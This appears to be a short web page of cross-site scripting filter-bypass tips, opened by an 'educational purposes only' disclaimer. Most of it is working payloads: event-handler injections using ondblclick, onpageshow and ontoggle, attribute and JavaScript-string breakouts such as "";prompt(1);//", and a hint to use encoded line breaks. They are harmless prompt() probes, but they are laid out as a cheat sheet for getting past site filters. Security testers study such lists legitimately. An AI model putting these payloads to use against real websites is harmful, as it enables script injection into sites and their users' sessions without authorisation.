Warning
==============

All the information provided on this site is for educational purposes only.

The site or the authors are not responsible for any misuse of the information.

You shall not misuse the information to gain unauthorized access and/or write malicious programs.

These information shall only be used to expand knowledge and not for causing malicious or damaging attacks.

Did you break out of a tag and script, iframe, img, a, &gt; etc are all blocked?
==============

Did they block onerror onload onclick? Try something like this:

&lt;XXXXXXX ondblclick=prompt(1)&gt;Some Text, Don't even care to end the tag either.

" onclick="prompt(1)

<body onpageshow="prompt(123)"> 

<details open ontoggle="prompt('xss via toggle')">Toggle Me For More prompts</details>

Don't forget the injection might not be a form tag but in the javascript.
==============
";prompt(1);//

';prompt(1);//

What if they are in a function? Break out of it. Count the brackets, etc to kill the function.

"};prompt(1);//

Don't forget %0D%0A if you need a new line
